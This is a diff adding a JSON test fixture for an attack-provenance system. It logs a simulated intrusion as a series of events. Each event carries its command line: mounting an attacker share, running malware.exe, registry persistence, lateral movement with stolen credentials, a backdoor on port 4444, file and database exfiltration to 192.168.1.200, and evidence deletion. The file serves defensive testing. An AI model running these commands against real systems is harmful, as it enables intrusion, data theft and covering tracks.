@@ -1,0 +1,233 @@
+{
+  "metadata": {
+    "description": "跨设备攻击溯源系统测试数据",
+    "scenario": "模拟攻击者从外部IP 192.168.1.200 发起的跨设备攻击",
+    "generated_at": "2024-01-15T10:00:00Z"
+  },
+  "events": [
+    {
+      "timestamp": "2024-01-15T10:00:00Z",
+      "event_type": "NETWORK_CONNECTION",
+      "subject": {
+        "host": "workstation-01"
+      },
+      "object": {
+        "path": "//192.168.1.200/share/malware.exe"
+      },
+      "cmdLine": "net use \\\\192.168.1.200\\share /user:admin password123",
+      "description": "Network connection to external share",
+      "process_name": "net.exe",
+      "user": "SYSTEM"
+    },
+    {
+      "timestamp": "2024-01-15T10:01:30Z",
+      "event_type": "FILE_CREATE",
+      "subject": {
+        "host": "workstation-01"
+      },
+      "object": {
+        "path": "C:\\temp\\malware.exe"
+      },
+      "cmdLine": "copy \\\\192.168.1.200\\share\\malware.exe C:\\temp\\",
+      "description": "File copied from external source",
+      "process_name": "copy.exe",
+      "user": "SYSTEM"
+    },
+    {
+      "timestamp": "2024-01-15T10:02:00Z",
+      "event_type": "PROCESS_CREATE",
+      "subject": {
+        "host": "workstation-01"
+      },
+      "object": {
+        "path": "C:\\temp\\malware.exe"
+      },
+      "cmdLine": "C:\\temp\\malware.exe -install -silent",
+      "description": "Malicious process execution",
+      "process_name": "malware.exe",
+      "user": "SYSTEM"
+    },
+    {
+      "timestamp": "2024-01-15T10:03:00Z",
+      "event_type": "REGISTRY_MODIFY",
+      "subject": {
+        "host": "workstation-01"
+      },
+      "object": {
+        "path": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor"
+      },
+      "cmdLine": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /d C:\\temp\\malware.exe",
+      "description": "Registry persistence mechanism",
+      "process_name": "reg.exe",
+      "user": "SYSTEM"
+    },
+    {
+      "timestamp": "2024-01-15T10:04:00Z",
+      "event_type": "NETWORK_CONNECTION",
+      "subject": {
+        "host": "workstation-01"
+      },
+      "object": {
+        "path": "//server-02/admin$/system32"
+      },
+      "cmdLine": "net use \\\\server-02\\admin$ /user:administrator stolen_password",
+      "description": "Lateral movement to server",
+      "process_name": "net.exe",
+      "user": "SYSTEM"
+    },
+    {
+      "timestamp": "2024-01-15T10:05:00Z",
+      "event_type": "FILE_CREATE",
+      "subject": {
+        "host": "server-02"
+      },
+      "object": {
+        "path": "C:\\Windows\\system32\\backdoor.exe"
+      },
+      "cmdLine": "copy C:\\temp\\malware.exe \\\\server-02\\admin$\\system32\\backdoor.exe",
+      "description": "Malware propagation to server",
+      "process_name": "copy.exe",
+      "user": "administrator"
+    },
+    {
+      "timestamp": "2024-01-15T10:06:00Z",
+      "event_type": "PROCESS_CREATE",
+      "subject": {
+        "host": "server-02"
+      },
+      "object": {
+        "path": "C:\\Windows\\system32\\backdoor.exe"
+      },
+      "cmdLine": "C:\\Windows\\system32\\backdoor.exe -server -port 4444",
+      "description": "Backdoor server execution",
+      "process_name": "backdoor.exe",
+      "user": "administrator"
+    },
+    {
+      "timestamp": "2024-01-15T10:07:00Z",
+      "event_type": "NETWORK_CONNECTION",
+      "subject": {
+        "host": "server-02"
+      },
+      "object": {
+        "path": "192.168.1.200:4444"
+      },
+      "cmdLine": "netstat -an | findstr 4444",
+      "description": "Backdoor connection to attacker",
+      "process_name": "backdoor.exe",
+      "user": "administrator"
+    },
+    {
+      "timestamp": "2024-01-15T10:08:00Z",
+      "event_type": "FILE_READ",
+      "subject": {
+        "host": "server-02"
+      },
+      "object": {
+        "path": "C:\\Users\\Administrator\\Documents\\sensitive_data.xlsx"
+      },
+      "cmdLine": "type C:\\Users\\Administrator\\Documents\\sensitive_data.xlsx",
+      "description": "Sensitive data access",
+      "process_name": "cmd.exe",
+      "user": "administrator"
+    },
+    {
+      "timestamp": "2024-01-15T10:09:00Z",
+      "event_type": "NETWORK_CONNECTION",
+      "subject": {
+        "host": "server-02"
+      },
+      "object": {
+        "path": "//192.168.1.200/exfil"
+      },
+      "cmdLine": "copy C:\\Users\\Administrator\\Documents\\sensitive_data.xlsx \\\\192.168.1.200\\exfil\\",
+      "description": "Data exfiltration to attacker server",
+      "process_name": "copy.exe",
+      "user": "administrator"
+    },
+    {
+      "timestamp": "2024-01-15T10:10:00Z",
+      "event_type": "NETWORK_CONNECTION",
+      "subject": {
+        "host": "server-02"
+      },
+      "object": {
+        "path": "//database-03/data"
+      },
+      "cmdLine": "sqlcmd -S database-03 -E -Q \"SELECT * FROM users\"",
+      "description": "Database access attempt",
+      "process_name": "sqlcmd.exe",
+      "user": "administrator"
+    },
+    {
+      "timestamp": "2024-01-15T10:11:00Z",
+      "event_type": "FILE_CREATE",
+      "subject": {
+        "host": "database-03"
+      },
+      "object": {
+        "path": "C:\\temp\\db_dump.sql"
+      },
+      "cmdLine": "sqlcmd -S localhost -E -Q \"BACKUP DATABASE users TO DISK='C:\\temp\\db_dump.sql'\"",
+      "description": "Database dump creation",
+      "process_name": "sqlcmd.exe",
+      "user": "sa"
+    },
+    {
+      "timestamp": "2024-01-15T10:12:00Z",
+      "event_type": "NETWORK_CONNECTION",
+      "subject": {
+        "host": "database-03"
+      },
+      "object": {
+        "path": "//192.168.1.200/exfil/db_dump.sql"
+      },
+      "cmdLine": "copy C:\\temp\\db_dump.sql \\\\192.168.1.200\\exfil\\",
+      "description": "Database exfiltration",
+      "process_name": "copy.exe",
+      "user": "sa"
+    },
+    {
+      "timestamp": "2024-01-15T10:13:00Z",
+      "event_type": "FILE_DELETE",
+      "subject": {
+        "host": "workstation-01"
+      },
+      "object": {
+        "path": "C:\\temp\\malware.exe"
+      },
+      "cmdLine": "del C:\\temp\\malware.exe",
+      "description": "Evidence cleanup",
+      "process_name": "cmd.exe",
+      "user": "SYSTEM"
+    },
+    {
+      "timestamp": "2024-01-15T10:14:00Z",
+      "event_type": "FILE_DELETE",
+      "subject": {
+        "host": "server-02"
+      },
+      "object": {
+        "path": "C:\\Windows\\system32\\backdoor.exe"
+      },
+      "cmdLine": "del C:\\Windows\\system32\\backdoor.exe",
+      "description": "Backdoor cleanup",
+      "process_name": "cmd.exe",
+      "user": "administrator"
+    },
+    {
+      "timestamp": "2024-01-15T10:15:00Z",
+      "event_type": "FILE_DELETE",
+      "subject": {
+        "host": "database-03"
+      },
+      "object": {
+        "path": "C:\\temp\\db_dump.sql"
+      },
+      "cmdLine": "del C:\\temp\\db_dump.sql",
+      "description": "Database dump cleanup",
+      "process_name": "cmd.exe",
+      "user": "sa"
+    }
+  ]
+}
